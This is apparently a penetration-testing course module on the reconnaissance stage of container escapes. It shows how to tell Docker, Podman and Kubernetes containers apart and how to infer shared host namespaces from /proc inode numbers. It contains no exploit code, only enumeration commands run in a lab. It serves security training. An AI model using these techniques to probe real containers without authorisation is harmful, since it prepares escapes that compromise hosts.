Containers typically isolate a process from accessing information about the host and other processes. This is achieved by using multiple layers of defense, including segmenting processes into separate _namespaces_, limiting capabilities, restricting _syscalls_, and blocking unusual behavior.

Often, however, environments may require a container to have additional permissions from the host, exposing an opportunity for the container to escape out of its intended boundary. The container might, for example, monitor network connections and need to share the host's network namespace or manage kernel modules and need the specific capability to do so. In some situations, it may be possible to escape a container by exploiting a _kernel vulnerability_ without the container even needing additional permissions.

_Misconfigurations_ resulting in potential container escapes are fairly common. An inexperienced engineer might be following a misguided example on how to fix a specific problem, or an experienced engineer just might not have any other option. Understanding these misconfigurations and how to exploit them is valuable in security assessments. It's important to mention that standard _information gathering_ techniques still apply. For example, it's still important to search the file system for sensitive files and information as if the target were a traditional host. In fact, much of the methodology around container escapes follows traditional Linux privilege escalation.

It's important to note that not all "escapes" result in _code execution_ on the host. Some escapes allow us to read sensitive data from the host, while others can be used to modify the host to expose a greater attack surface or even to execute code.

All _container escapes_ assume that we have some level of code execution in the container. The purpose of this Module is to gather information that will aid in various methods of escaping a container. In this module, we will specifically work with containers built and executed under the _Open Container Initiative_ (OCI) specification. Containers run in Docker, Kubernetes, and Podman follow the OCI specification. We won't be focusing on other non-OCI containers like LXC.

In this Learning Module, we will cover the following Learning Units:

- Information Gathering
- Discovering Sensitive Data

## 1.1. Information Gathering

The first step in escaping a container is to _enumerate_ and _extract_ useful information about the container and host. In order to escape a container, we need to know what the configuration of the container might be.

While there are many tools that can assist us with gathering information about the container, they're not useful to us if we need to install a significant amount of packages. Typical design best practices dictate that containers should install only the minimum required packages. Because of this, we will gather the information using a minimal number of tools.

This Learning Unit covers the following Learning Objectives:

- Understand how to access the lab
- Discover which namespaces a container shares with the host
- Explore the Linux capabilities provided to a container
- Determine if any sensitive mounts are on the host
- Review which devices the container has access to
- Discover what environment variables a container has

## 1.1.1. Accessing the Labs

In this Learning Unit, we'll use a single server to learn about information gathering techniques. This is a bare-bones _Ubuntu_ machine with _Docker_[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_119-1) and _Podman_[2](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_119-2) installed using default settings.

To access the server, we have created an **/etc/hosts** file entry on our _Kali Linux_ VM.

```
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.121.100  sandbox
```

> Listing 1 - /etc/hosts entry

For now, we'll simply set up our **hosts** file on our Kali machine and start the virtual machine. While we are progressing through the Learning Unit, we will SSH into the host on port 22 and start various containers to understand the impact certain configurations have on the attack surface of a container.

The goal of a typical container escape relates to gaining additional access to the host outside the intended limits of a container. In our lab we already have access to the host, but the point is to learn about the boundaries between the container and the host. When performing real world container escapes, we'll often find that we have some initial access to a container, then attempt to gain additional access to other containers or system actions. For that reason, exercise machines will allow us to SSH directly into a container on port 2222 to simulate access to a shell via some exploit. Both the username and password of the container will be _root_.

For now, let's start the host for the information gathering portion and continue with the Module.

1

(Docker Inc, 2022), [https://www.docker.com/](https://www.docker.com/) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_119-1)

2

(Podman, 2022), [https://podman.io/](https://podman.io/) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_119-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Information Gathering

## 1.1.2. Discovering the Runtime

One of the first pieces of information that will be important to us is to determine which container runtime is currently in use. A container runtime (also called container engine) is a low-level software component that can be used for running containers in a host machine. In some situations, finding this information is trivial, in others it might be more complicated. We'll start a container in Docker, Podman, and _Kubernetes_ and inspect the various pieces of information that might suggest what is running the container. Let's start with Docker.

We'll SSH into our VM and start a container in **docker**. We will use the **run** command to start a new container, using the **-it** flag to allow us to interact with the container and give us terminal access. By using the **--rm** flag, we can remove the container after we exit to keep our environment clean. We will also specify the name of the image, **ubuntu** in this case. Finally, we'll execute **/bin/bash** in the container so that we can execute other commands.

```
student@kali:~$ ssh student@sandbox
student@sandbox's password: 
...
student@sandbox:~$ docker run -it --rm ubuntu /bin/bash
root@1548a130be98:/#
```

> Listing 2 - Connecting to the Sandbox VM

By default, Docker will include a **.dockerenv** file in the **root** directory. If we also inspect the mounts, we should find a reference to the **/var/lib/docker/** directory. Let's investigate this and confirm that the files exist.

```
root@1548a130be98:/# ls -alh /.dockerenv
-rwxr-xr-x 1 root root 0 Oct  3 23:04 /.dockerenv

root@1548a130be98:/# cat /proc/mounts | head -n 1
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/JWGYMU6GE76RH4YD7DZVEKKPML:/var/lib/docker/overlay2/l/DXGPJLFREBWVIVNSRZXCBE347B,upperdir=/var/lib/docker/overlay2/bcfabd65cab75bb6782cb36adb993f8f329c3461f6525eabd31efac3e5dcf1f0/diff,workdir=/var/lib/docker/overlay2/bcfabd65cab75bb6782cb36adb993f8f329c3461f6525eabd31efac3e5dcf1f0/work)
```

> Listing 3 - Reviewing mounts and dockerenv

As expected, we can find references to **.dockerenv** in the root directory and the **/var/lib/docker/** directory in mounts output. At the time of this writing, **.dockerenv** is nearly undocumented; however, we don't expect Docker to remove this anytime soon, as some internal scripts rely on it.

By reviewing the mounts and searching for the **.dockerenv** file, we can confirm that the runtime for this container is Docker.

Next, let's move onto Podman. Instead of **/.dockerenv**, Podman containers use **/run/.containerenv**.[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_120-1) Unlike Docker, Podman _does_ document this feature with the message:

A container environment file is created in each container to indicate to programs they are running in a container. This file is located at /run/.containerenv.

Podman also sets an _environment variable_ named _container_ to _podman_ for support with _systemd_.[2](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_120-2)

Let's inspect this in a container. We'll start a Podman container using the same arguments we used for Docker.

```
root@1548a130be98:/# exit

student@sandbox:~$ podman run -it --rm ubuntu /bin/bash

root@ba64403f6070:/# ls -alh /run/.containerenv
-rw-r--r-- 1 root root 0 Oct  3 23:15 /run/.containerenv

root@ba64403f6070:/# printenv
HOSTNAME=ba64403f6070
PWD=/
container=podman
...
root@ba64403f6070:/#
```

> Listing 4 - Reviewing containerenv and Environment Variables

As expected, we find the _container_ environment variable and an empty **/run/.containerenv** file. The Podman documentation for the **/run/.containerenv** file also states:

When using the --privileged flag the ".containerenv" file contains name/value pairs indicating the container engine version, whether the engine is running in rootless mode, the container name and ID, as well as the image name and ID that the container is based on.

Let's try running a _privileged container_ and inspecting the **.containerenv** file.

```
root@ba64403f6070:/# exit
exit

student@sandbox:~$ podman run -it --rm --privileged ubuntu /bin/bash

root@d12a98c5d797:/# cat /run/.containerenv
engine="podman-3.4.4"
name="epic_meninsky"
id="d12a98c5d797ff612311ca26b4ade47b67365bc271b7570c565e74308b197a49"
image="docker.io/library/ubuntu:latest"
imageid="21735dab04ba60a144c23c491690a46073e06c72fdcc100f61bc610124eaa8c9"
rootless=1
```

> Listing 5 - Reviewing /run/.containerenv in privileged container

As the documentation describes, the file contains much more information about the runtime. Not only is this information useful, it also indicates we're running in a privileged container that is trivial to escape from.

Next, let's move on to Kubernetes. Kubernetes itself can use many container runtimes. Sometimes we may be able to determine which runtime is in use; other times, we may not.

By reviewing the environment variables, we can determine if a container is running in a _Kubernetes cluster_. Kubernetes will set various environment variables to allow a _pod_ to connect to the Kubernetes cluster. Reviewing the mounts might also provide more information.

Let's start a container using the **kubectl** command and the **run** sub-command. We'll give the container a name of **runtimeinfo**, use the **ubuntu** image, and remove the container after exit with the **--rm** flag. We'll also instruct kubernetes to use the local image availible by setting the **--image-pull-policy** argument to **Never**. Finally, we'll specify that we want to run **/bin/bash**.

```
root@d12a98c5d797:/# exit
exit

student@sandbox:~$ kubectl run -it runtimeinfo --image=ubuntu --image-pull-policy='Never' --rm /bin/bash
If you don't see a command prompt, try pressing enter.

root@runtimeinfo:/# printenv
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=runtimeinfo
PWD=/
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
...
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
...

root@runtimeinfo:/# mount | head -n 1
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/35/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/49/work)
```

> Listing 6 - Gathering Runtime Info in Kubernetes

By reviewing the output of printenv and mount, we'll find that the current container is indeed running in a Kubernetes cluster. We also find by reviewing the mounts that the container is running in the _k3s_ distribution and using the _containerd_ runtime.

This information should be useful as we try to extract even more information about the container. It's important to note that the application running in the container may be able to modify or remove environment variables and files after the container has started. Because of this, it's always good to verify the information in multiple locations.

1

(Podman, 2019), [https://docs.podman.io/en/latest/markdown/podman-run.1.html#description](https://docs.podman.io/en/latest/markdown/podman-run.1.html#description) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_120-1)

2

(systemd, 2022), [https://systemd.io/CONTAINER_INTERFACE/](https://systemd.io/CONTAINER_INTERFACE/) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_120-2)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Runtime 1

Container - Runtime 2

Container - Runtime 3

Container - Runtime 4

#### Labs

1. Using VM "Container - Runtime 1", ssh into the container on port 2222 with the username root and the password root. Which runtime does the container run in?

Answer

2. Using VM "Container - Runtime 2", ssh into the container on port 2222 with the username root and the password root. Which runtime does the container run in?

Answer

3. Using VM "Container - Runtime 3", ssh into the container on port 2222 with the username root and the password root. Which runtime does the container run in?

Answer

4. Using VM "Container - Runtime 4", ssh into the container on port 2222 with the username root and the password root. Which runtime does the container run in?

Answer

## 1.1.3. Detecting Namespaces

Namespaces are the backbone of containers. Namespaces allow certain kernel resources, like networking, to be isolated to individual processes. This means the namespaced process cannot interact or modify the host's resources or other processes' resources.

As of _Linux 5.6_, there are _eight_ different namespaces that a process can be segmented on: _mount_,[1](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-1) _process ID_ (PID),[2](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-2) _network_,[3](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-3) _interprocess communication_ (IPC),[4](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-4) _Unix time-sharing_ (UTS),[5](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-5) _user ID_,[6](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-6) _control group_ (cgroup),[7](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-7) and _time_.[8](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-8) There is also a proposed namespace for _syslog_.

While containers should be isolated, certain functionality requires sharing a namespace with the host or other containers. For example, in order for a process to send useful multicast traffic, that process needs to share the _network_ namespace with the host.

Detecting any namespaces shared with the host is one of the most important pieces of information that could result in a container escape. It's also more difficult to detect namespaces in a container since part of the isolation that namespaces aim to provide is preventing information leakage about the current namespace.

Let's SSH into our VM and start an Ubuntu container in **docker**.

```
student@kali:~$ ssh student@sandbox
student@sandbox's password: 
...

student@sandbox:~$ docker run -it --rm ubuntu /bin/bash
root@6671abdae7b5:/#
```

> Listing 7 - Connecting to the Sandbox VM

In a container, the first process in the _process tree_ will be namespaced based on the _container engine_. We can find the supported namespaces by reviewing the **/proc/1/ns** directory. The **proc** file system is a special file system that contains information about the current state of the kernel. The **1** directory points to the first PID in the tree. If we were to replace the **1** with **self**, we would be pointing to the current process ID. The **ns** directory contains the list of supported namespaces.

```
root@6671abdae7b5:/# ls /proc/self/ns/
cgroup  ipc  mnt  net  pid  pid_for_children  time  time_for_children  user  uts
```

> Listing 8 - Listing the Supported Namespaces

While this list shows us that the kernel supports these various namespaces, it does not indicate if the container shares any of the namespaces with the host or any other container. To find that out, we need to dig deeper. The host's initial namespace will always need to be created before the container's. Let's investigate the **timestamps** file to determine the creation time of the files. We'll use **ls** to list the files again, but this time we'll display the long output with **-l**. We'll also follow all symbolic links with **-L**.

```
root@6671abdae7b5:/# ls -lL /proc/self/ns/
total 0
-r--r--r-- 1 root root 0 Sep 30 23:37 cgroup
-r--r--r-- 1 root root 0 Sep 30 23:37 ipc
-r--r--r-- 1 root root 0 Sep 30 23:37 mnt
-r--r--r-- 1 root root 0 Sep 30 23:37 net
-r--r--r-- 1 root root 0 Sep 30 23:37 pid
-r--r--r-- 1 root root 0 Sep 30 23:37 pid_for_children
-r--r--r-- 1 root root 0 Sep 30 23:37 time
-r--r--r-- 1 root root 0 Sep 30 23:37 time_for_children
-r--r--r-- 1 root root 0 Sep 30 23:37 user
-r--r--r-- 1 root root 0 Sep 30 23:37 uts
```

> Listing 9 - Listing the time for each file

Unfortunately, the time shows exactly the same for all the namespaces. The time displayed here is the creation time of the container. However, the timestamp doesn't truly represent the creation order of the files. Linux contains multiple timestamps for files, including when they were last accessed and last modified. The _index node_ (inode)[9](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-9) of the file stores this information. Each inode contains a unique identifier that is incremented for each new file.

If we investigate the _inode identifier_, we may be able to determine the creation order of the namespace files. To find the inode, we can use the **-i** flag in **ls**. We'll also pipe the output into **sort** to order the files based on their inode.

```
root@6671abdae7b5:/# ls -Lli /proc/self/ns/ | sort
4026531834 -r--r--r-- 1 root root 0 Sep 30 23:37 time
4026531834 -r--r--r-- 1 root root 0 Sep 30 23:37 time_for_children
4026531835 -r--r--r-- 1 root root 0 Sep 30 23:37 cgroup
4026531837 -r--r--r-- 1 root root 0 Sep 30 23:37 user
4026532256 -r--r--r-- 1 root root 0 Sep 30 23:37 mnt
4026532257 -r--r--r-- 1 root root 0 Sep 30 23:37 uts
4026532258 -r--r--r-- 1 root root 0 Sep 30 23:37 ipc
4026532259 -r--r--r-- 1 root root 0 Sep 30 23:37 pid
4026532259 -r--r--r-- 1 root root 0 Sep 30 23:37 pid_for_children
4026532260 -r--r--r-- 1 root root 0 Sep 30 23:37 net
total 0
```

> Listing 10 - Listing namespace inodes

By reviewing the list of supported namespaces and their inodes, we'll notice something interesting. The _time_, _cgroup_, and _user_ namespace inodes are very close. However, the inodes for _MNT_, _UTS_, _IPC_, _PID_, and _network_ are incremented by one. The difference between the _MNT_ inode (4026532256) and the _time_ inode (4026531834) is 422. This significant difference indicates that the creation time of the _time_, _cgroup, and _user_ namespaces was much earlier than the other namespaces.

We can ignore the pid_for_children and time_for_children namespaces, as they are not important to this Module.

By default, Docker doesn't use the _user_ namespace or _cgroup_. This means that the user inode most likely shares the host's _user_ namespace and, based on the inode, so does _time_ and _cgroup_. However, the remainder of the namespaces are unique to this container.

It's important to note that this output will change in the future. For example, Docker 20.10.0 added support for the _cgroup_ namespace[10](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-10) (although, the default is to share the host's cgroup namespace). Docker is also planning on adding support for the _time_ namespace.[11](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-11) The Linux kernel will also continue adding support for new namespaces. However, the namespaces shared with the kernel should always have a lower inode than those that are not.

Let's exit this container and start a new one with a shared _pid_ and _network_ namespace. We'll do this by specifying the **--pid** flag and the **--network** option set to **host**. Finally, we'll list the namespace directory again.

```
root@6671abdae7b5:/# exit
exit

student@sandbox:~$ docker run -it --pid host --network host --rm ubuntu

root@sandbox:/# ls -Lli /proc/self/ns/ | sort
4026531834 -r--r--r-- 1 root root 0 Oct  3 17:12 time
4026531834 -r--r--r-- 1 root root 0 Oct  3 17:12 time_for_children
4026531835 -r--r--r-- 1 root root 0 Oct  3 17:12 cgroup
4026531836 -r--r--r-- 1 root root 0 Oct  3 17:12 pid
4026531836 -r--r--r-- 1 root root 0 Oct  3 17:12 pid_for_children
4026531837 -r--r--r-- 1 root root 0 Oct  3 17:12 user
4026531840 -r--r--r-- 1 root root 0 Oct  3 16:21 net
4026532254 -r--r--r-- 1 root root 0 Oct  3 17:12 mnt
4026532255 -r--r--r-- 1 root root 0 Oct  3 17:12 uts
4026532256 -r--r--r-- 1 root root 0 Oct  3 17:12 ipc
total 0
```

> Listing 11 - Listing with Shared network and PID Namespace

As shown in the Listing above, when sharing the _pid_ and _network_ namespaces with the host, the inodes for those namespaces are lower than the new ones for the other namespaces.

Using this information, we can fairly confidently confirm if a container we obtain a shell in is sharing a namespace with the host. This means we can more accurately form an attack to escape the container.

Next, let's investigate Podman and Kubernetes. We'll begin with Podman by starting a new container and listing **/proc/self/ns/**.

```
student@sandbox:~$ podman run -it  --rm ubuntu

root@a9fed5c65b2b:/#  ls -Lli /proc/self/ns/ | sort
4026531834 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 time
4026531834 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 time_for_children
4026531835 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 cgroup
4026532251 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 user
4026532254 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 net
4026532317 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 mnt
4026532319 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 uts
4026532320 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 ipc
4026532321 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 pid
4026532321 -r--r--r-- 1 nobody nogroup 0 Oct  3 18:37 pid_for_children
total 0
```

> Listing 12 - Lising inode For Namespaces in Podman

Unlike Docker, Podman uses the _user_ namespace by default. This means that the _user_ inode will be close to the inodes of the _network_, _MNT_, _UTS_, _IPC_, and _PID_ inodes.

Let's review the output from a Kubernetes pod. It's important to note that each Kubernetes distribution engine might handle the namespaces differently. For example, network connectivity is handled by the _container network interface_ (CNI) plugin installed in the cluster. Different CNIs might create the _network_ namespace at different times.

In our example, we will review a Kubernetes pod running in _K3s_. By default, K3s uses _containerd_ as the runtime and _flannel_ as the CNI. Let's start an Ubuntu container using **kubectl**. We'll give the container a name of **nsinfo**.

```
student@sandbox:~$ kubectl run -it nsinfo --image=ubuntu --image-pull-policy='Never' --rm /bin/bash
If you don't see a command prompt, try pressing enter.

root@nsinfo:/# ls -Lli /proc/self/ns | sort
4026531834 -r--r--r-- 1 root root 0 Oct  3 20:00 time
4026531834 -r--r--r-- 1 root root 0 Oct  3 20:00 time_for_children
4026531835 -r--r--r-- 1 root root 0 Oct  3 20:00 cgroup
4026531837 -r--r--r-- 1 root root 0 Oct  3 20:00 user
4026532254 -r--r--r-- 1 root root 0 Oct  3 19:59 net
4026532464 -r--r--r-- 1 root root 0 Oct  3 20:00 uts
4026532465 -r--r--r-- 1 root root 0 Oct  3 20:00 ipc
4026532467 -r--r--r-- 1 root root 0 Oct  3 20:00 mnt
4026532468 -r--r--r-- 1 root root 0 Oct  3 20:00 pid
4026532468 -r--r--r-- 1 root root 0 Oct  3 20:00 pid_for_children
4026532469 -r--r--r-- 1 root root 0 Oct  3 20:00 cgroup
total 0
```

> Listing 13 - Listing inode for Namespaces in a Kubernetes Pod

As shown in the Listing above, we can conclude that the container is in a separate namespace for _network_, _IPC_, _MNT_, and _PID_. While the _network_ namespace has a higher inode than the other namespaces, it's still lower than the _time_, _cgroup_, and _user_. We can conclude that these three (_user_, _cgroup_, and _time_) namespace inodes are most likely shared with the host.

Tools to detect if a process is namespaced exist, but they are not actively developed and have become inaccurate. One example of this is the _amicontained_[12](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-12) tool, which can only detect the _user_ and _PID_ namespace. Let's inspect the source code[13](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fn-local_id_125-13) for how it detects these to determine if it's still valid.

```
456  // HasNamespace determines if a container is using a particular namespace or the
457  // host namespace.
458  // The device number of an unnamespaced /proc/1/ns/{ns} is 4 and anything else is
459  // higher.
460  // Only works from inside a container.
461  func HasNamespace(ns string) (bool, error) {
462          file := fmt.Sprintf("/proc/1/ns/%s", ns)
463
464          // Use Lstat to not follow the symlink.
465          var info syscall.Stat_t
466          if err := syscall.Lstat(file, &info); err != nil {
467                  return false, &os.PathError{Op: "lstat", Path: file, Err: err}
468          }
469
470          // Get the device number. If it is higher than 4 it is in a namespace.
471          if info.Dev > 4 {
472                  return true, nil
473          }
474
475          return false, nil
476  }
```

> Listing 14 - Reviewing the HasNamespace Function in amicontained

The comment at the top of the function (lines 456-460) explains the thought process. By inspecting the device number (not the inode), we should be able to determine if the container is namespaced or not. We'll start a Docker container and display the device number for the _user_ namespace (knowing that it's shared with the host) and the _pid_ namespace (knowing that it's not shared with the host). We'll use **stat** against the respective files and specify that we only want the device number with **--format="%d"** argument.

```
student@sandbox:~$ docker run -it  --rm ubuntu /bin/bash

root@6db58200a0dd:/# stat --format="%d" /proc/1/ns/user
139

root@6db58200a0dd:/# stat --format="%d" /proc/1/ns/pid
139
```

> Listing 15 - Device Number set to 139 For both Namesapces

As shown above, the device number is 139. This means that the device number mechanism is no longer valid.

It's important to note that detecting namespaces via inodes is subjective. Determining a "significant" difference in inodes from _shared_ and _unshared_ namespaces will depend on the operating system and the container runtime. However, using this method we can, with decent confidence, determine if a container is namespaced.

For _network_ namespaces, we can also confirm if we are sharing with the host by inspecting the output of the **ip a** command. If we find network interfaces that we expect the host to have, we can assume that we're sharing the host's namespace. Similarly, we can confirm the _pid_ namespace by running **ps aux** and trying to find processes we expect the host to be running.

1

(Michael Kerrisk, 2021), [https://man7.org/linux/man-pages/man7/mount_namespaces.7.html](https://man7.org/linux/man-pages/man7/mount_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-1)

2

(Michael Kerrisk, 2020), [https://man7.org/linux/man-pages/man7/pid_namespaces.7.html](https://man7.org/linux/man-pages/man7/pid_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-2)

3

(Michael Kerrisk, 2020), [https://man7.org/linux/man-pages/man7/network_namespaces.7.html](https://man7.org/linux/man-pages/man7/network_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-3)

4

(Michael Kerrisk, 2019), [https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html](https://man7.org/linux/man-pages/man7/ipc_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-4)

5

(Michael Kerrisk, 2019), [https://man7.org/linux/man-pages/man7/uts_namespaces.7.html](https://man7.org/linux/man-pages/man7/uts_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-5)

6

(Michael Kerrisk, 2021), [https://man7.org/linux/man-pages/man7/user_namespaces.7.html](https://man7.org/linux/man-pages/man7/user_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-6)

7

(Michael Kerrisk, 2020), [https://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html](https://man7.org/linux/man-pages/man7/cgroup_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-7)

8

(Michael Kerrisk, 2021), [https://man7.org/linux/man-pages/man7/time_namespaces.7.html](https://man7.org/linux/man-pages/man7/time_namespaces.7.html) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-8)

9

(Wikipedia, 2022), [https://en.wikipedia.org/wiki/Inode](https://en.wikipedia.org/wiki/Inode) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-9)

10

(Moby, 2019), [https://github.com/moby/moby/pull/38377](https://github.com/moby/moby/pull/38377) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-10)

11

(Moby, 2019), [https://github.com/moby/moby/issues/39163](https://github.com/moby/moby/issues/39163) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-11)

12

(Jess Frazelle, 2020), [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-12)

13

(Jess Frazelle, 2018), [https://github.com/genuinetools/amicontained/blob/568b0d35e60cb2bfc228ecade8b0ba62c49a906a/vendor/github.com/jessfraz/bpfd/proc/proc.go#L456-L476](https://github.com/genuinetools/amicontained/blob/568b0d35e60cb2bfc228ecade8b0ba62c49a906a/vendor/github.com/jessfraz/bpfd/proc/proc.go#L456-L476) [↩︎](https://portal.offsec.com/learning-paths/cloud-attacks-container-escapes-skill-path-178608/learning/container-escapes-information-gathering-51034/discovering-sensitive-data-51090/host-pid-accessing-host-processes-51043#fnref-local_id_125-13)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Container - Namespace 1

Container - Namespace 2

Container - Namespace 3

Container - Namespace 4

#### Labs

